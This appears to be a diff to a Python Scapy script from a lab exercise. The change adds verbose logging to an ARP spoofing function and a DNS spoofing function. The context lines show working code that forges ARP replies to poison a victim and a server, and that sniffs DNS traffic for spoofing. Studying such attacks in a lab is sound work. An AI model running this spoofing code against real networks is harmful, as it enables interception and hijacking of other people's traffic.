@@ -14,6 +14,10 @@ def ARP_spoofing(verbose=False):
     macM2 = "08:00:27:CC:28:6f"
     macM3 = "08:00:27:d0:25:4b"
 
+    if verbose:
+        print "Starting ARP spoofing attack"
+        print "Creating forged ARP packet to send towards victim"
+
     arp_M1 = Ether() / ARP()
     arp_M1[Ether].src = macM3
     arp_M1[ARP].hwsrc = macM3
@@ -21,17 +25,27 @@ def ARP_spoofing(verbose=False):
     arp_M1[ARP].hwdst = macM1
     arp_M1[ARP].pdst = ipM1
 
+    if verbose:
+        print "Creating forged ARP packet to send towards server"
+
     arp_M2 = Ether() / ARP()
     arp_M2[Ether].src = macM3
     arp_M2[ARP].hwsrc = macM3
     arp_M2[ARP].psrc = ipM1
     arp_M2[ARP].hwdst = macM2
     arp_M2[ARP].pdst = ipM2
+
+    if verbose:
+        print "Sending forged packets on interface 'enp0s3'"
+
     sendp(arp_M1, iface = "enp0s3")
     sendp(arp_M2, iface = "enp0s3")
 
 # DNS-Spoof Attack
 def dns_spoof_attack(verbose=False):
+    if verbose:
+        print "Starting DNS spoof attack"
+
     packets = sniff(filter='udp port 53', count=8, prn=process_packet)
     # for packet in packets:
     #     if packet.haslayer(DNS):
